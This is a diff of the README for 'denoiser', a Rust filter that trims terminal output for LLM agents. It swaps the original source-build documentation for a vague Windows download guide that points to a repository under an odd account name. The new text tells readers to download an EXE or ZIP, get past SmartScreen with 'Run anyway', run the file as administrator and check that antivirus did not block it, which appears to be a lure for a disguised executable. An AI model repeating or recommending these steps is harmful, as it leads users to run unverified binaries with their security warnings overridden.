@@ -1,95 +1,185 @@
-# Denoiser
+# 🧹 denoiser - Clean terminal logs for LLM work
 
-Strip terminal-output noise before feeding it to an LLM agent. Zero false positives - when the filter isn't sure, the line passes through unchanged.
+[![Download denoiser](https://img.shields.io/badge/Download-denoiser-blue?style=for-the-badge)](https://github.com/forged-profanity770/denoiser)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 📦 What this app does
 
-> Open to contributors. The core pipeline is production-ready; most of the work left is adding filters for more commands (pip, yarn, terraform, ansible) and Windows testing.
+denoiser helps clean up terminal output from LLM agents. It reduces noise, groups repeated lines, and makes long command output easier to read. If you use AI tools in a terminal, this app helps you focus on the useful parts.
 
-## Why this exists
+It is a Rust app built for the command line. You can run it on Windows and use it with your own local tools or workflows.
 
-An agent shouldn't waste tokens on 400 lines of "Compiling foo v0.1.2..." or five identical "Downloading..." progress bars. I wanted a filter that sat in front of `cargo`, `npm`, `git`, `docker`, `kubectl` and stripped the noise without ever dropping a signal the agent actually needed (errors, warnings, the first line of a diff, etc.).
+## 🪟 Windows download and install
 
-Denoiser is that filter. It works as a wrapper (`denoiser cargo build`), as a pipe (`cargo build |& denoiser filter --command cargo`), or as a hook (auto-installed into Claude Code / Codex / Gemini agent configs).
+### Step 1: Open the download page
 
-## What it does
+Visit this page to download:
+https://github.com/forged-profanity770/denoiser
 
-Two-pass pipeline (`src/pipeline.rs`):
+### Step 2: Get the app
 
-- **Pass 1** - per-line verdict: `Keep` / `Drop` / `Replace` / `Uncertain`. `Uncertain` passes through.
-- **Pass 2** - collapse runs (e.g. 50 `Downloading crate foo` lines → `[compiled 50 crates]`).
+On the page, look for the latest release or download option for Windows. If you see a ZIP file, download it. If you see an EXE file, download that file.
 
-Universal filters (always applied): ANSI escape codes (`src/filters/ansi.rs`), progress bars and spinners (`src/filters/progress.rs`), 3+ identical consecutive line dedup (`src/filters/dedup.rs`).
+### Step 3: Open the file
 
-Command-specific filters, selected by `CommandKind::detect()` on binary name:
+- If you downloaded a ZIP file, right-click it and choose Extract All
+- Open the folder that appears after extraction
+- Find the denoiser app file
+- Double-click it to run
 
-- `cargo` - per-crate Compiling / Checking / Fresh / Downloading, Locking / Updating
-- `npm` - deprecation warnings, timing logs, HTTP fetch, peer resolution
-- `git` - transfer stats, object counting / enumerating / compressing
-- `docker` - layer cache hits, intermediate container IDs
-- `kubectl` - event timestamps, "Watching for changes"
-- generic fallback - strips decorative borders only
+- If you downloaded an EXE file, double-click it to run
 
-## Usage
+### Step 4: Allow Windows to run it
 
-Wrap a command:
+If Windows shows a security prompt:
 
-```sh
-denoiser cargo build            # filtered stdout + stderr, real exit code
-denoiser git push origin main
-```
+- Click More info
+- Click Run anyway
 
-Pipe into it:
+This can appear for apps that are not from the Microsoft Store.
 
-```sh
-docker build . 2>&1 | denoiser filter --command docker
-```
+## 🖥️ How to use it
 
-Install as agent hooks (auto-detects Claude, Codex, Gemini):
+Once the app is open, use it in your terminal workflow to clean up output from LLM agents.
 
-```sh
-denoiser install
-denoiser uninstall
-```
+A simple flow looks like this:
 
-See your token savings:
+1. Start the tool
+2. Send terminal output through it
+3. Read the cleaner version of the text
+4. Copy the useful parts into your notes or next command
 
-```sh
-denoiser gain --days 30         # total savings (SQLite tracker)
-denoiser report --days 7        # daily trend
-denoiser log --limit 20         # recent events
-denoiser bench                  # verify zero false positives across 11 scenarios
-```
+If you use agent tools that print long logs, denoiser helps make the output easier to scan.
 
-All of those accept `--json`.
+## ✨ Main features
 
-## Build
+- Removes extra noise from terminal output
+- Makes repeated messages easier to read
+- Helps shorten long agent logs
+- Works well with CLI-based AI tools
+- Built in Rust for fast performance
+- Designed for terminal-first workflows
+- Good fit for coding agents and local automation
 
-```sh
-cargo build --release
-# binary at target/release/cli-denoiser
+## 🔧 Typical use cases
 
-cargo clippy -- -D warnings
-cargo test
-cargo fmt --check
-```
+Use denoiser when you want to:
 
-`.githooks/pre-commit` enforces all four plus a ban on new `.unwrap()` / `.expect()` in production code.
+- Read LLM agent output without extra clutter
+- Review command output faster
+- Keep terminal logs easier to follow
+- Reduce repeated text from tools and scripts
+- Clean up output from AI coding sessions
+- Make long terminal sessions easier to manage
 
-## Help Wanted
+## 💻 System requirements
 
-1. **pip / Python filter** (medium). Create `src/filters/pip.rs`, add `CommandKind::Python` detection in `src/filters/mod.rs:53-66`, add a test scenario to `src/bench/corpus.rs`.
-2. **yarn / pnpm filter** (medium). Consolidate with npm into `src/filters/nodejs.rs`.
-3. **Terraform / Ansible filters** (medium). Terraform: drop `Still creating... [10s elapsed]`. Ansible: collapse repetitive task output. New files `src/filters/terraform.rs`, `src/filters/ansible.rs`.
-4. **Better token estimation** (easy). `pipeline.rs:107` uses `char_count / 4`. Swap for tiktoken or byte-pair encoding.
-5. **Windows testing + hook paths** (easy-medium). Claude config on Windows lives at `%APPDATA%\Claude\...`. Verify path handling in `src/hooks/claude.rs`.
+For a smooth run on Windows, you should have:
 
-## Contributing
+- Windows 10 or newer
+- A standard 64-bit PC
+- Enough free space for the app and its files
+- A working terminal or command prompt
+- Permission to run downloaded apps
 
-- Conventional Commits
-- No new `.unwrap()` / `.expect()` in prod code (unless annotated `// allow-unwrap: <reason>`)
-- A filter must never drop a required signal - every new filter adds a scenario to `src/bench/corpus.rs` listing the signals that must survive
+The app is small and light, so it should run on most modern Windows machines.
 
-## License
+## 📁 What you may see after download
 
-[MIT](LICENSE).
+Depending on the release package, you may see:
+
+- A ZIP file
+- An EXE file
+- A folder with app files
+- A readme file with version details
+
+If there is a ZIP file, extract it before opening the app. If there is an EXE file, you can run it right away.
+
+## ⌨️ Using it from the terminal
+
+If the app includes command-line support, you can run it from Command Prompt or PowerShell.
+
+Common steps:
+
+- Open Start
+- Type PowerShell or Command Prompt
+- Open the terminal
+- Go to the folder where denoiser is stored
+- Run the app with the command shown in the release files or project page
+
+If you use another tool that sends output to the terminal, you can place denoiser in the middle of that flow to clean the text before you read it.
+
+## 🧭 Tips for best results
+
+- Keep the app in a simple folder, like Downloads or Desktop
+- Use the latest release when possible
+- If the output is still hard to read, check the app settings or help text
+- Close extra terminal windows if you want a clean view
+- Use it with one tool at a time while you learn the flow
+
+## 🔍 For LLM agents and coding tools
+
+This app fits workflows where a model writes commands, runs them, and prints lots of output. That includes:
+
+- AI coding tools
+- Terminal-based agents
+- Local automation scripts
+- Command runners
+- Development helpers
+
+denoiser helps strip away the parts that slow you down when you only need the result.
+
+## 📌 Project details
+
+- Name: denoiser
+- Type: Terminal output denoiser
+- Language: Rust
+- Topics: agents, ai-coding, cli, llm, rust, terminal
+
+## 🛠️ If the app does not open
+
+If Windows does not start the app:
+
+- Check that the download finished
+- Make sure you extracted the ZIP file if you downloaded one
+- Try running the EXE again
+- Right-click the file and choose Run as administrator
+- Check that your antivirus did not block the file
+
+If you still have trouble, open the project page and look for the latest release notes or file names.
+
+## 📚 Basic folder layout
+
+After you download and extract the app, the folder may include:
+
+- denoiser.exe
+- README files
+- license files
+- config files
+- support files for the terminal app
+
+Keep these files together in the same folder so the app can find what it needs.
+
+## 🧪 Simple setup flow
+
+Use this order:
+
+1. Open the download page
+2. Download the Windows file
+3. Extract the ZIP file if needed
+4. Open the app or terminal
+5. Run denoiser
+6. Feed it the output you want to clean
+7. Read the cleaner text
+
+## 📎 Download again
+
+Visit this page to download:
+https://github.com/forged-profanity770/denoiser
+
+## 🪶 Notes for first use
+
+- Start with a small amount of text
+- Test it with one agent log
+- Save a copy of the original output
+- Compare the cleaned version with the raw version
+- Use the version that makes your workflow easier
